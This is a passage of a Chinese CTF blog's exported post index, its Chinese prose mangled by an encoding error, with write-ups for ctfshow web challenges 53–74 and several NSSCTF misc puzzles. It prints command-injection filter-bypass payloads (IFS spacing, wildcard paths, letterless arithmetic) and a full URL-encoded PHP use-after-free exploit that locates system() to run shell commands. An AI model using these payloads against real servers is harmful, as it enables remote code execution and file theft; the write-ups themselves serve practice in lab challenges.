ob_get_contents();//å¾—åˆ°ç¼“å†²åŒºçš„æ•°æ®ã€‚ob_end_clean();//ä¼šæ¸…é™¤ç¼“å†²åŒºçš„å†…å®¹ï¼Œå¹¶å°†ç¼“å†²åŒºå…³é—­ï¼Œä½†ä¸ä¼šè¾“å‡ºå†…å®¹ã€‚å¯ä»¥ç”¨exit();åœæ­¢åé¢çš„ç¨‹åºã€‚ payload: 1c=include(&quot;/flag.txt&quot;);exit(); web72è¿™é“é¢˜è¿‡æ»¤äº†æ•°å­—å’Œå­—æ¯ï¼Œä¸ä¼šä¸€ç‚¹ä¸ä¼šã€‚å‚è€ƒä¸€ä¸‹å¤§ä½¬çš„wpå°† 1234567c=?&gt;&lt;?php$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125;exit(0);?&gt; è¿›è¡Œurlç¼–ç ã€‚ 1c=?%3E%3C?php%0A$a=new%20DirectoryIterator(%22glob:///*%22);%0Aforeach($a%20as%20$f)%0A%7Becho($f-%3E__toString().&#x27;%20&#x27;);%0A%7D%0Aexit(0);%0A?%3E çœ‹åˆ°äº†flag0.txt,ä½†æ˜¯ç›´æ¥includeçš„è¯æ²¡æœ‰æƒé™ã€‚è¦ç”¨ä»€ä¹ˆuafç»•è¿‡payload: 1c=function%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20&#x27;WIN&#x27;))%20%7B%0A%20%20%20%20%20%20%20%20die(&#x27;This%20PoC%20is%20for%20*nix%20systems%20only.&#x27;)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%0A%20%20%20%20trigger_uaf(&#x27;x&#x27;)%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B%0A%3F%3E å¾—åˆ°flag web73globéå†ç›®å½•ï¼Œæ¶¨çŸ¥è¯†äº†ã€‚ 1234567c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125;exit(0);?&gt; è¦è¿›è¡Œurlç¼–ç å‘ç°äº†flagc.txtpayload: 1c=include(&quot;/flagc.txt&quot;);exit(); web74è¿˜æ˜¯åŒæ ·çš„æ­¥éª¤ï¼Œglobéå†ç›®å½•flagåœ¨flagx.txté‡Œpayloadï¼š 1c=include(&quot;/flagx.txt&quot;);exit();","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"},{"name":"ctfshow","slug":"web/ctfshow","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/"},{"name":"åˆ·é¢˜","slug":"web/ctfshow/åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/%E5%88%B7%E9%A2%98/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"}]},{"title":"NSSCTF MISCåˆ·é¢˜","slug":"NSSCTF-MISCåˆ·é¢˜","date":"2023-01-24T11:17:06.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2023/01/24/NSSCTF-MISCåˆ·é¢˜/","permalink":"https://lvzhouhang.xyz/2023/01/24/NSSCTF-MISC%E5%88%B7%E9%A2%98/","excerpt":"[SWPUCTF 2021 æ–°ç”Ÿèµ›]æˆ‘çš„é“¶è¡Œå¡å¯†ç å‹ç¼©åŒ…æœ‰å¯†ç ï¼Œè€Œä¸”æ˜¯6ä½æ•°ã€‚ç”¨ARCHPRç ´è§£ï¼Œå¯†ç æ˜¯768521ã€‚","text":"[SWPUCTF 2021 æ–°ç”Ÿèµ›]æˆ‘çš„é“¶è¡Œå¡å¯†ç å‹ç¼©åŒ…æœ‰å¯†ç ï¼Œè€Œä¸”æ˜¯6ä½æ•°ã€‚ç”¨ARCHPRç ´è§£ï¼Œå¯†ç æ˜¯768521ã€‚ è§£å‹ä¹‹åæ˜¯ä¸€ä¸ªmdæ–‡ä»¶ç›´æ¥å°±æ‡µäº†ï¼Œçœ‹åˆ«äººçš„wpåå‘ç°æ˜¯ç”¨æ‰‹æœºçš„ä¹å®«æ ¼è§£å¯†çš„ï¼Œè¿˜æ˜¯å†™çš„å°‘ï¼Œæ¶¨çŸ¥è¯†äº†ã€‚è§£å‡ºæ¥ä¹‹åæ˜¯YLOPJOGJVOCCYNMZYPGXGPOGJDVIGATBASHåé¢çš„ATBASHå°±æ˜¯æç¤ºå°†YLOPJOGJVOCCYNMZYPGXGPOGJDVIGè¿›è¡ŒATBASHè§£å¯†ï¼Œå¾—åˆ°BOLKQLTQELXXBMNABKTCTKLTQWERTï¼Œåé¢çš„QWERTå°±æ˜¯QWERTåŠ å¯†ï¼Œä¹Ÿæ˜¯ä¸ªæç¤ºã€‚å°†BOLKQLTQELXXBMNABKTCTKLTè¿›è¡ŒQWERTè§£å¯†ï¼Œå¾—åˆ°XISRASEACSUUXZYKXREVERSE,åé¢çš„reverseè¿˜æ˜¯ä¸ªæç¤ºå¾—åˆ°XKYZXUUSCAESARSIX,caesar sixä¹Ÿæ˜¯ä¸ªæç¤ºå‡¯æ’’å¯†ç 6ï¼Œå¾—åˆ°RESTROOMï¼Œæœ€ååœ¨RESERVEä¸€ä¸‹NSSCTF&#123;moortser&#125;å°±æ˜¯flagã€‚ [SWPU 2019]æ¼‚æµè®°çš„é©¬é‡Œå¥¥ç‚¹å¼€exeæ–‡ä»¶å‡ºç°ä¸€ä¸ª1.txtæç¤ºæ˜¯ntfsï¼Œå¯ä»¥ç”¨NtfsStreamsEditor2æˆ–è€…è†œæ‹œxennyå¤§ä½¬cmdè½¬åˆ°æ–‡ä»¶åœ°å€ï¼Œå‘½ä»¤è¡Œnotepad 1.txt:flag.txtæœ€åçš„flagæ˜¯NSSCTF&#123;ddg_is_cute&#125; [SWPUCTF 2021 æ–°ç”Ÿèµ›]gifå¥½åƒæœ‰ç‚¹å¤§ä¸‹è½½æ–‡ä»¶åæ˜¯ä¸ªGIFå›¾ï¼Œç”¨STEG SOLVEæ‰“å¼€ï¼Œåœ¨ç¬¬562å¸§çš„æ—¶å€™æœ‰ä¸€ä¸ªäºŒç»´ç ï¼Œæ‰«ç å°±æ˜¯flag NSSCTF&#123;The_G1F_ls_T00_b1g&#125; [HUBUCTF 2022 æ–°ç”Ÿèµ›]æœ€ç®€å•çš„miscç”¨stegsolveæ‰“å¼€ï¼ŒLSBéšå†™ï¼Œå¾—åˆ°ä¸€ä¸ªäºŒç»´ç ï¼Œç„¶åæ‰«ç ä¹‹åå°±æ˜¯flag:NSSCTF&#123;aacc4238460996f0178c18d7637c9dd5&#125; å”‰ï¼miscé¢˜å†™çš„æ¶å¿ƒï¼Œå°±æ˜¯è·Ÿä½œè€…å¯¹è„‘ç”µæ³¢å˜›ã€‚","categories":[{"name":"MISC","slug":"MISC","permalink":"https://lvzhouhang.xyz/categories/MISC/"},{"name":"NSSCTF","slug":"MISC/NSSCTF","permalink":"https://lvzhouhang.xyz/categories/MISC/NSSCTF/"},{"name":"åˆ·é¢˜","slug":"MISC/NSSCTF/åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/categories/MISC/NSSCTF/%E5%88%B7%E9%A2%98/"}],"tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"MISC","slug":"MISC","permalink":"https://lvzhouhang.xyz/tags/MISC/"},{"name":"NSSCTF","slug":"NSSCTF","permalink":"https://lvzhouhang.xyz/tags/NSSCTF/"}]},{"title":"ctfshow webå…¥é—¨57~68","slug":"ctfshow-webå…¥é—¨57","date":"2023-01-22T06:59:58.000Z","updated":"2025-04-19T13:25:38.279Z","comments":true,"path":"2023/01/22/ctfshow-webå…¥é—¨57/","permalink":"https://lvzhouhang.xyz/2023/01/22/ctfshow-web%E5%85%A5%E9%97%A857/","excerpt":"web57é¢˜ç›®æ˜¾ç¤ºflagåœ¨36.phpä¸­ï¼Œè€Œä¸”ç»™å‡ºcatå’Œphpäº†ï¼Œåªè¦æƒ³åŠæ³•æ„é€ å‡º36å°±å¯ä»¥äº†ã€‚$(())æ˜¯åšè¿ç®—ï¼Œ$(($&#123;_&#125;))=0,æ‰€ä»¥åªè¦æ‹¼æ¥é™¤-36ä¹‹åå–åå°±è¡Œpayload: 1?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))","text":"web57é¢˜ç›®æ˜¾ç¤ºflagåœ¨36.phpä¸­ï¼Œè€Œä¸”ç»™å‡ºcatå’Œphpäº†ï¼Œåªè¦æƒ³åŠæ³•æ„é€ å‡º36å°±å¯ä»¥äº†ã€‚$(())æ˜¯åšè¿ç®—ï¼Œ$(($&#123;_&#125;))=0,æ‰€ä»¥åªè¦æ‹¼æ¥é™¤-36ä¹‹åå–åå°±è¡Œpayload: 1?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) web58é¢˜å¾ˆçŸ­ï¼Œä½†æ˜¯æˆ‘ä¸ä¼šã€‚ã€‚ã€‚å‚è€ƒæ–‡ç« payloadå¤ªå¤šäº† 1c=show_source(&quot;flag.php&quot;); web59å’Œweb58å·®ä¸å¤šã€‚payloadï¼š 1c=show_source(&quot;flag.php&quot;); web60å’Œå‰ä¸¤é“é¢˜ä¸€æ ·ã€‚payload: 1c=show_source(&quot;flag.php&quot;); web 61~65è¿™äº›é¢˜éƒ½ä¸€æ ·ã€‚payloadï¼š 1c=show_source(&quot;flag.php&quot;); web66è¿™ä¸€é“é¢˜show_sourceä¸èƒ½ç”¨äº†ã€‚è€Œä¸”flagè¿˜ä¸åœ¨flag.phpä¸­ã€‚å…ˆç”¨ 1var_dump(scandir(&#x27;/&#x27;)); æŸ¥çœ‹ç›®å½•ç»“æ„ï¼Œå‘ç°æ˜¯flag.txtpayload: 1c=highlight_flie(&quot;/flag.txt&quot;); web67è¿™ä¸€é¢˜å’Œä¸Šä¸€é¢˜ä¸€æ ·ã€‚ 1c=highlight_file(&quot;/flag.txt&quot;); web68è¿™ä¸€é“é¢˜æˆ‘éƒ½æ‡µäº†ï¼Œæ€ä¹ˆä¸ç»™æºç å•Šã€‚çœ‹åˆ«äººçš„wpè¯´çš„æ¢æˆæ–‡ä»¶åŒ…å«å°±å¯ä»¥ã€‚ã€‚ã€‚ã€‚payload: 1c=include(&quot;/flag.txt&quot;);","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"},{"name":"ctfshow","slug":"web/ctfshow","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/"},{"name":"åˆ·é¢˜","slug":"web/ctfshow/åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/%E5%88%B7%E9%A2%98/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"}]},{"title":"ctfshow webå…¥é—¨53~56","slug":"ctfshow-webå…¥é—¨52~56","date":"2023-01-20T09:23:44.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/01/20/ctfshow-webå…¥é—¨52~56/","permalink":"https://lvzhouhang.xyz/2023/01/20/ctfshow-web%E5%85%A5%E9%97%A852~56/","excerpt":"web53å¤šè¿‡æ»¤äº†ä¸€ä¸ªwgetï¼Œå¤šæ·»åŠ äº†ä¸€ä¸ªå›æ˜¾ã€‚payload: 1?c=ca&#x27;&#x27;t$&#123;IFS&#125;fla&#x27;&#x27;g.php","text":"web53å¤šè¿‡æ»¤äº†ä¸€ä¸ªwgetï¼Œå¤šæ·»åŠ äº†ä¸€ä¸ªå›æ˜¾ã€‚payload: 1?c=ca&#x27;&#x27;t$&#123;IFS&#125;fla&#x27;&#x27;g.php web54è¿™é“å°†ä½¿ç”¨&#39;&#39;çš„æ–¹å¼ç»™å‰”é™¤äº†ã€‚å»ç½‘ä¸Šæ‰¾å…¶ä»–äººçš„wpå‘ç°å¥½å‡ ç§æ–¹æ³•ã€‚ç¬¬ä¸€ç§ï¼šå¯ä»¥ç”¨mvã€‚payload: 12/?c=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;abc.txt/abc.txt ç¬¬äºŒç§ï¼š 1grep test *file #åœ¨å½“å‰ç›®å½•ä¸­ï¼ŒæŸ¥æ‰¾åç¼€æœ‰ file å­—æ ·çš„æ–‡ä»¶ä¸­åŒ…å« test å­—ç¬¦ä¸²çš„æ–‡ä»¶ï¼Œå¹¶æ‰“å°å‡ºè¯¥å­—ç¬¦ä¸²çš„è¡Œ payloadï¼š 1?c=grep$&#123;IFS&#125;ctf$&#123;IFS&#125;fl???php ç¬¬ä¸‰ç§ï¼šå¯ä»¥ç”¨revé€†åºè¾“å‡ºpayload: 1?c=rev$&#123;IFS&#125;fl?????? ç¬¬å››ç§ï¼šç”¨pasteç›´æ¥æŸ¥çœ‹payload: 1?c=paste$&#123;IFS&#125;fl?????? ç¬¬äº”ç§ï¼šå¯ä»¥ç†è§£ä¸ºå½“å‰ç›®å½•è¿è¡Œcatå‘½ä»¤å®é™…ä¸Šè¿è¡Œçš„ä¹Ÿæ˜¯bin/catã€‚payloadï¼š 1/bin/?at$&#123;IFS&#125;fl?????? web55é¢˜æ˜¯çœŸçš„æ¶å¿ƒï¼Œè„‘å­æœ‰ç‚¹ç—’ï¼Œæ„Ÿè§‰è¦é•¿è„‘å­äº†ã€‚ã€‚ã€‚ã€‚ç»§æ— å­—æ¯æ•°å­—çš„å‘½ä»¤æ‰§è¡Œ(ctfshow webå…¥é—¨ 55)æ–°å§¿åŠ¿payload: 1?c=/???/????64 ????.??? web56é¢˜æ˜¯è¶Šæ¥è¶Šéš¾äº†ã€‚å‚è€ƒPç¥çš„æ–‡ç« ä¸Šæ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡é¦–å…ˆæ„é€ ä¸€ä¸ªPOSTä¸Šä¼ 